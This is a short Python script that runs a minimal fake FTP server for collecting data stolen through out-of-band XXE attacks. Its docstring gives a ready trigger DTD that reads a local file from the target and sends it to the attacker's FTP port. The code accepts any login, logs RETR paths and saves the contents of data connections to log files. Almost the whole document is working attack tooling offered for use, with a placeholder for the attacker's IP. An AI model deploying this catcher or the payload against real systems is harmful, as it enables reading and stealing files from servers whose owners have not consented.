#!/usr/bin/env python3
"""Minimal FTP exfil catcher for XXE OOB. Ctrl :2121, data :2122.
RETR command paths -> ftp_exfil.log ; full data-connection bytes -> ftp_exfil_data.log.
Replace ATTACKER_IP_HERE with your public IP before running.
Trigger DTD: <!ENTITY % file SYSTEM "file:///PATH"><!ENTITY % eval "<!ENTITY % exfil SYSTEM 'ftp://ATTACKER:2121/%file;'>">%eval;%exfil;
"""
import socket, threading, time
CTRL, DATA = 2121, 2122
LOG = open("ftp_exfil.log", "a"); DAT = open("ftp_exfil_data.log", "a")
def log(s):
    LOG.write(s + "\n"); LOG.flush()
def data_srv():
    ds = socket.socket(); ds.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ds.bind(("0.0.0.0", DATA)); ds.listen(5); log(f"DATA on {DATA}")
    while True:
        try:
            c, _ = ds.accept(); buf = b""
            c.settimeout(10)
            try:
                while True:
                    ch = c.recv(4096)
                    if not ch: break
                    buf += ch
            except Exception: pass
            c.close()
            DAT.write(f"\n--- EXFIL {time.strftime('%H:%M:%S')} ({len(buf)}B) ---\n")
            DAT.write(buf.decode(errors="replace")); DAT.write("\n--- END ---\n"); DAT.flush()
            log(f"EXFIL {len(buf)}B")
        except Exception as e:
            log(f"data err {e}")
def handle(conn):
    conn.sendall(b"220 ok\r\n")
    def send(s): conn.sendall(s.encode() + b"\r\n")
    while True:
        try:
            d = conn.recv(4096)
        except Exception:
            return
        if not d:
            return
        line = d.decode(errors="replace").strip()
        if not line:
            continue
        log(f"CMD {line}")
        cmd = line.split()[0].upper()
        if cmd == "USER": send("331 ok")
        elif cmd == "PASS": send("230 ok")
        elif cmd == "SYST": send("215 UNIX")
        elif cmd == "PWD": send("257 /")
        elif cmd == "TYPE": send("200 ok")
        elif cmd == "PASV": send("227 Entering Passive Mode (ATTACKER_IP_HERE,8,74)")
        elif cmd == "PORT": send("200 ok")
        elif cmd == "RETR":
            log(f"RETR>> {line[5:].strip()}")
            send("150 Opening"); send("226 Done")
        elif cmd in ("LIST", "NLST"): send("150"); send("226")
        elif cmd == "QUIT": send("221 bye"); return
        else: send("200 ok")
threading.Thread(target=data_srv, daemon=True).start()
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", CTRL)); s.listen(5); log(f"CTRL on {CTRL}")
while True:
    c, a = s.accept(); log(f"CONN {a}"); threading.Thread(target=handle, args=(c,), daemon=True).start()
